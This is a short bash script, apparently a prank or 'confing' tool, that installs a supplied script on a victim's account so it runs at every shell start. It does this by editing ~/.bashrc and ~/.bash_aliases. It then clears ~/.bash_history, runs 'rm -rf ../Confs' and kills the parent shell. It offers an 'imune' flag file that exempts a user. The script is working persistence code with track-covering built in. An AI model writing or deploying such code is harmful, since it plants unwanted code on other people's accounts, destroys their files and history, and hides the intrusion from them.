#!/bin/bash

DIRPATH=~/.local/share/AllezCiao
FILE=~/.bash_aliases
TEMOIN=$DIRPATH/TEMOIN
imune=$DIRPATH/imune

if [ $# -ne 1 ]
then
  echo "Usage: ./$0 [Script_name/imune]"
  exit
fi

if [ "$1" == "imune" ]
then
  if [ ! -d $DIRPATH ]
  then
    mkdir $DIRPATH
  fi
  touch $imune
  exit
fi

if [ -f $imune ]
then
  echo "This person cannot be confed, Call a competent Astek"
  exit
fi

if [ ! -f $TEMOIN ]
then
  touch $TEMOIN
  mkdir $DIRPATH
  echo "if [ -f $FILE ]; then" >> ~/.bashrc                             
  echo ". $FILE" >> ~/.bashrc                                           
  echo "fi" >> ~/.bashrc
fi

cp "$1" "$DIRPATH/"
chmod +x "$DIRPATH/$1"

if [ -f $FILE ]
then
  echo "bash $DIRPATH/$1 &" >> $FILE
else
  echo "bash $DIRPATH/$1 &" > $FILE
fi

cat /dev/null > ~/.bash_history
rm -rf ../Confs

bash $DIRPATH/$1 &
sleep 3

kill -9 $PPID
